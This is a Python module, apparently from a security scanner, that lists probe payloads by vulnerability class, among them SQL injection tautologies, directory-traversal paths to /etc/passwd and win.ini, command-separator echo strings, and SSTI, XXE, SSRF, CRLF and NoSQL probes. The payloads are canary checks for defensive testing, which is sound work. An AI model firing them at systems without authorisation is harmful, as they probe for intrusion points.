"""
Safe, Controlled, Non-Destructive Payload and Canary Generator.
Generates targeted probe payloads for vulnerability surface verification without destructive actions.
"""

from typing import List, Dict, Any

CANARY_ID = "tcq_audit_probe"

# Non-destructive test vectors categorized by vulnerability class
PROBES: Dict[str, List[Dict[str, Any]]] = {
    "SQL_Injection": [
        {
            "payload": f"' OR '1'='1",
            "type": "boolean_true",
            "description": "Safe boolean-true tautology check"
        },
        {
            "payload": f"' AND '1'='2",
            "type": "boolean_false",
            "description": "Safe boolean-false differential check"
        },
        {
            "payload": f"1' AND 1=1 --",
            "type": "comment_boundary",
            "description": "Single-quote comment closure probe"
        },
        {
            "payload": f"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,'{CANARY_ID}',0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
            "type": "error_based_canary",
            "description": "Error-based safe canary reflection probe"
        }
    ],
    "Cross_Site_Scripting": [
        {
            "payload": f"<tcqcanary data='{CANARY_ID}'>",
            "type": "reflection_tag",
            "description": "Benign HTML custom tag reflection probe"
        },
        {
            "payload": f"\"><tcqprobe>{CANARY_ID}</tcqprobe>",
            "type": "attribute_breakout",
            "description": "Attribute breakout benign tag probe"
        },
        {
            "payload": f"javascript:/*{CANARY_ID}*/void(0)",
            "type": "protocol_handler",
            "description": "Safe javascript: scheme reflection check"
        }
    ],
    "Directory_Traversal": [
        {
            "payload": "../../../../etc/passwd",
            "type": "unix_traversal",
            "description": "Read-only relative file path reference"
        },
        {
            "payload": "..\\..\\..\\..\\windows\\win.ini",
            "type": "win_traversal",
            "description": "Windows system file reference"
        },
        {
            "payload": "....//....//....//etc/passwd",
            "type": "filter_bypass_traversal",
            "description": "Nested traversal encoding probe"
        }
    ],
    "Command_Injection": [
        {
            "payload": f"; echo {CANARY_ID};",
            "type": "semicolon_echo",
            "description": "Harmless echo command separator probe"
        },
        {
            "payload": f"| echo {CANARY_ID}",
            "type": "pipe_echo",
            "description": "Harmless pipe echo probe"
        },
        {
            "payload": f"& echo {CANARY_ID} &",
            "type": "ampersand_echo",
            "description": "Harmless ampersand echo probe"
        }
    ],
    "Server_Side_Template_Injection": [
        {
            "payload": "{{31337*2}}",
            "type": "jinja_math",
            "expected_reflection": "62674",
            "description": "Arithmetic evaluation probe (Jinja/Twig)"
        },
        {
            "payload": "${31337*2}",
            "type": "expression_language",
            "expected_reflection": "62674",
            "description": "EL / MVEL arithmetic probe"
        },
        {
            "payload": "<%= 31337*2 %>",
            "type": "erb_math",
            "expected_reflection": "62674",
            "description": "ERB / ASP arithmetic probe"
        }
    ],
    "XML_External_Entity": [
        {
            "payload": f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "{CANARY_ID}">]><root>&test;</root>',
            "type": "internal_entity",
            "description": "Harmless internal XML entity resolution check"
        }
    ],
    "Server_Side_Request_Forgery": [
        {
            "payload": "http://127.0.0.1:80/",
            "type": "loopback_http",
            "description": "Loopback interface probe"
        },
        {
            "payload": "http://localhost:8080/",
            "type": "localhost_probe",
            "description": "Local service probe"
        }
    ],
    "CRLF_Injection": [
        {
            "payload": f"%0d%0aX-TCQ-Probe:{CANARY_ID}",
            "type": "header_injection",
            "description": "Harmless custom response header injection probe"
        }
    ],
    "Open_Redirect": [
        {
            "payload": "https://example.com/tcq-redirect-check",
            "type": "external_url",
            "description": "Benign external URL redirection probe"
        },
        {
            "payload": "//example.com/tcq-redirect-check",
            "type": "protocol_relative",
            "description": "Protocol-relative redirection probe"
        }
    ],
    "NoSQL_Injection": [
        {
            "payload": '{"$gt": ""}',
            "type": "mongo_gt",
            "description": "Benign MongoDB $gt operator probe"
        },
        {
            "payload": '{"$ne": null}',
            "type": "mongo_ne",
            "description": "Benign MongoDB $ne operator probe"
        }
    ]
}


def get_probes_for_category(category: str) -> List[Dict[str, Any]]:
    """Retrieve non-destructive probes for a specific vulnerability class."""
    return PROBES.get(category, [])


def get_all_categories() -> List[str]:
    """List all categories supported by the non-destructive fuzzing engine."""
    return list(PROBES.keys())
